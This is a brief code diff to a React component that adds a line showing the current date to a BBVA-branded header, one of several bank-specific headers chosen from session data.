@@ -131,6 +131,7 @@ export default function ClientScreen() {
     } else if (sessionData.banco === 'BBVA') {
       return (
         <header className="bg-[#072146] text-white p-4 text-center">
+          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={bbvaLogoWhite} 
             className="h-20 inline-block white-logo" 
